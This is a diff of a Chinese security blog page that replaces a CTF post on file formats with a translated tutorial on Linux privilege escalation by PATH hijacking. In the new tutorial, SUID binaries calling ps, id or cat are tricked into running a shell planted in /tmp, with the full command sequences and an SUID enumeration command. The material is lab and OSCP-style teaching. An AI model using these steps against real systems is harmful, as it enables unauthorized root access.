@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>常见文件格式分析 · threst&#39;s Blog</title>
+    <title>利用 PATH 环境变量进行 Linux 提权 · threst&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -207,7 +207,7 @@
                 <a href="/" >threst&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">常见文件格式分析</a>
+                <a href="#" class="post-name">利用 PATH 环境变量进行 Linux 提权</a>
             </div>
     </div>
     
@@ -239,7 +239,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            常见文件格式分析
+            利用 PATH 环境变量进行 Linux 提权
             <!-- 404 -->
             
         </h1>
@@ -257,13 +257,13 @@ height:50vh;
             
                 <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "安全客弃婴">安全客弃婴</a>
     
 </div>
             
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2018/06/01</span>
+                <span class="post-intro-time">2018/06/06</span>
                 
                 <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                     <span class="iconfont-archer">&#xe602;</span>
@@ -389,29 +389,62 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="文件格式概述"><a href="#文件格式概述" class="headerlink" title="文件格式概述"></a>文件格式概述</h1><p>文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在windows系统中，计算机通常采用扩展名的方式来区分不同的文件格式，ctf中考察文件格式大致分为4的类：</p>
-<ul>
-<li>文本格式：<code>.txt</code>,<code>.doc</code>,<code>.docx</code></li>
-<li>图像格式：<code>.png</code>,<code>.jpg</code>,<code>bmp</code>,<code>.gif</code></li>
-<li>音频格式:<code>.mp3</code>,<code>.wma</code>,<code>.wav</code></li>
-<li>视频格式:<code>.mp4</code>,<code>.rmvb</code>,<code>.avi</code></li>
-</ul>
-<h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt即英文text的缩写，通常是指windows操作系统自带的一种纯文本文件格式</p>
-<h3 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h3><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，的哦出现相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大</p>
-<h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><p><code>89 50 4e 47 0d 0a 1a</code><br>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分<br><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p>
-<p>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/</a></p>
-<h3 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h3><p>属于有损压缩的与平台无关的图像格式，jpeg的压缩比高(可高达100：1),png主要是块，而jpeg主要是以段的形式<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/</a></p>
-<h2 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h2><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般<code>42 4D</code>，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量</p>
-<h2 id="gif格式"><a href="#gif格式" class="headerlink" title="gif格式"></a>gif格式</h2><p>也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/</a></p>
-<h3 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h3><p>mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位</p>
+        <h1 id="高考加油"><a href="#高考加油" class="headerlink" title="高考加油"></a>高考加油</h1><h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>在解决了几个OSCP挑战之后，我决定写一篇关于用于Linux提权方法的文章，这对我们的渗透测试项目很有帮助。在本文中，我们将学习“操纵$PATH变量的各种方法”，以获得远程主机的根访问权，以及CTF challenges用于提权的$PATH漏洞的技术。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PATH是Linux和unix操作系统中的环境变量，它存储可执行程序的所有bin和sbin目录。当用户在终端上运行命令时，它对shell的请求是根据用户执行的命令在PATH变量的帮助下搜索可执行文件。超级用户通常还拥有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。<br>使用echo命令查看用户路径。<br><code>echo $PATH</code><br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</p>
+<p>如果你注意到’.’在环境路径变量中，这意味着被记录的用户可以从当前目录执行二进制文件/脚本。</p>
+<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>目前，我们在<code>/home/raj</code>目录中，我们将创建一个名称为<code>/script</code>的新目录。现在在脚本目录中，我们将编写一个小c程序来调用系统二进制文件的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p>
+<p>你可以在我们的演示中看到我们的demo.c调用ps系统二进制文件命令。</p>
+<p><img src="https://p3.ssl.qhimg.com/t0159f31c3f43ed523c.png" alt=""></p>
+<p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br></pre></td></tr></table></figure></p>
+<h3 id="受害者的机虚拟机"><a href="#受害者的机虚拟机" class="headerlink" title="受害者的机虚拟机"></a>受害者的机虚拟机</h3><p>首先，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助下搜索具有SUID或4000权限的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>在上面的命令的帮助下，攻击者可以枚举任何可执行文件，这里我们还可以观察/home/raj/script/shell具有suid权限。</p>
+<p><img src="https://p4.ssl.qhimg.com/t0144143a89451f6dbe.png" alt=""></p>
+<p>然后我们进入/home/raj/script并看到一个可执行文件“shell”。我们运行这个文件，它看起来像正在运行ps，这是进程状态的一个真正的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+<h4 id="Echo-Command"><a href="#Echo-Command" class="headerlink" title="Echo Command"></a>Echo Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<h4 id="Copy-Command"><a href="#Copy-Command" class="headerlink" title="Copy Command"></a>Copy Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><img src="https://p0.ssl.qhimg.com/t018dafa3066188fc2b.png" alt=""></p>
+<h4 id="Symlink-command"><a href="#Symlink-command" class="headerlink" title="Symlink command"></a>Symlink command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ps</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p>注意:符号链接也被称为符号链接，如果该目录具有完整的权限，它将成功地工作。在Ubuntu中，对于符号链接，我们给了/script目录的权限777。<br>因此，我们看到攻击者可以操纵环境变量路径来升级特权并获得根访问。</p>
+<p><img src="https://p2.ssl.qhimg.com/t0111f758ef0283c98a.png" alt=""></p>
+<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>重复上述步骤来配置您自己的环境中，我们将编写一个小c程序来调用系统二进制文件的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p>
+<p>你可以在我们的demo.c正在调用id命令–它是系统二进制文件。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01372b3e8a96e1ca86.png" alt=""></p>
+<p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell2</span><br><span class="line">chmod u+s shell2</span><br><span class="line">ls -la shell2</span><br></pre></td></tr></table></figure></p>
+<h3 id="受害者的虚拟机"><a href="#受害者的虚拟机" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再一次，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助搜索具有SUID或4000权限的文件。在这里，我们还可以观察/home/raj/script/shell2具有suid权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>然后我们进入/home/raj/script，并看到一个可执行文件“shell2”。我们运行这个文件，它看起来像正在运行id。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./shell2</span><br></pre></td></tr></table></figure>
+<p><img src="https://p5.ssl.qhimg.com/t01239db93de93649fa.png" alt=""></p>
+<h4 id="Echo-command"><a href="#Echo-command" class="headerlink" title="Echo command"></a>Echo command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell2</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><img src="https://p0.ssl.qhimg.com/t01a9cb63912ec42e4b.png" alt=""></p>
+<h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令从内部读取内容etc/passwd文件。然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o raj</span><br><span class="line">chmod u+s raj</span><br><span class="line">ls -la raj</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://p4.ssl.qhimg.com/t013c40160a33742c61.png" alt=""></p>
+<h3 id="受害者的虚拟机-1"><a href="#受害者的虚拟机-1" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次破坏受害者的系统，然后转移到权限升级阶段，执行下面的命令来查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>在这里，我们还可以观察/home/raj/script/raj具有suid权限，然后进入/home/raj/script并看到一个可执行文件“raj”。所以当我们运行这个文件时，它就会输出etc/passwd文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">ls</span><br><span class="line">./raj</span><br></pre></td></tr></table></figure></p>
+<h4 id="Nano-Editor"><a href="#Nano-Editor" class="headerlink" title="Nano Editor"></a>Nano Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">nano cat</span><br></pre></td></tr></table></figure>
+<p>现在在终端输入/bin/bash当并保存它。</p>
+<p><img src="https://p3.ssl.qhimg.com/t01799ac7f0d1dad684.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./raj</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://p0.ssl.qhimg.com/t014ee07fb0f0ed221c.png" alt=""></p>
+<h2 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令来读取msg.txt是在/home/raj里面,但是/home/raj里面没有这样的文件,然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o ignite</span><br><span class="line">chmod u+s ignite</span><br><span class="line">ls -la ignite</span><br></pre></td></tr></table></figure>
+<p><img src="https://p4.ssl.qhimg.com/t01815bb5d1b2aff4ec.png" alt=""></p>
+<h3 id="受害者的虚拟机-2"><a href="#受害者的虚拟机-2" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次损害受害者的系统，然后转移到特权升级阶段，并执行下方命令以查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>在这里，我们还可以观察/home/ raj/script/拥有suid权限，然后我们进入/home/raj/script，看到一个可执行文件“ignite”。因此，当我们运行这个文件时，它会把一个错误“cat: /home/raj/msg.”txt”的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./ignite</span><br></pre></td></tr></table></figure>
+<h4 id="Vi-Editor"><a href="#Vi-Editor" class="headerlink" title="Vi Editor"></a>Vi Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vi cat</span><br></pre></td></tr></table></figure>
+<p>现在在终端输入/bin/bash当并保存它。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01ba696306656a5c53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./ignite</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://p3.ssl.qhimg.com/t018279fa8c54aceed2.png" alt=""><br>本文翻译:<a href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://threst.github.io">threst</a>
-            <p>原文链接: <a href="https://threst.github.io/2018/06/01/常见文件格式分析/">https://threst.github.io/2018/06/01/常见文件格式分析/</a>
-            <p>发表日期: <a href="https://threst.github.io/2018/06/01/常见文件格式分析/">June 1st 2018, 10:13:14</a>
+            <p>原文链接: <a href="https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/">https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/</a>
+            <p>发表日期: <a href="https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/">June 6th 2018, 11:13:14</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -419,17 +452,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/06/01/61随想/" title= 61随想 >
-                    <div class="nextTitle">61随想</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/06/01/如何在MIMIKATZ添加模块/" title= 如何在MIMIKATZ添加模块 >
-                    <div class="prevTitle">如何在MIMIKATZ添加模块</div>
+                <a href= "/2018/06/01/61随想/" title= 61随想 >
+                    <div class="prevTitle">61随想</div>
                 </a>
             
         </li>
@@ -530,7 +558,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件格式概述"><span class="toc-number">1.</span> <span class="toc-text">文件格式概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#txt格式"><span class="toc-number">1.0.1.</span> <span class="toc-text">txt格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doc-docx格式"><span class="toc-number">1.0.2.</span> <span class="toc-text">doc/docx格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#png格式"><span class="toc-number">1.0.3.</span> <span class="toc-text">png格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jpeg格式"><span class="toc-number">1.0.4.</span> <span class="toc-text">jpeg格式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bmp格式"><span class="toc-number">1.1.</span> <span class="toc-text">bmp格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gif格式"><span class="toc-number">1.2.</span> <span class="toc-text">gif格式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mp3"><span class="toc-number">1.2.1.</span> <span class="toc-text">mp3</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#高考加油"><span class="toc-number">1.</span> <span class="toc-text">高考加油</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面的话"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">1.2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法1"><span class="toc-number">1.3.</span> <span class="toc-text">方法1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#受害者的机虚拟机"><span class="toc-number">1.3.1.</span> <span class="toc-text">受害者的机虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Echo-Command"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Echo Command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Copy-Command"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Copy Command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Symlink-command"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">Symlink command</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法2"><span class="toc-number">1.4.</span> <span class="toc-text">方法2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#受害者的虚拟机"><span class="toc-number">1.4.1.</span> <span class="toc-text">受害者的虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Echo-command"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Echo command</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Method-3"><span class="toc-number">1.5.</span> <span class="toc-text">Method 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#受害者的虚拟机-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">受害者的虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nano-Editor"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Nano Editor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法4"><span class="toc-number">1.6.</span> <span class="toc-text">方法4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#受害者的虚拟机-2"><span class="toc-number">1.6.1.</span> <span class="toc-text">受害者的虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vi-Editor"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">Vi Editor</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
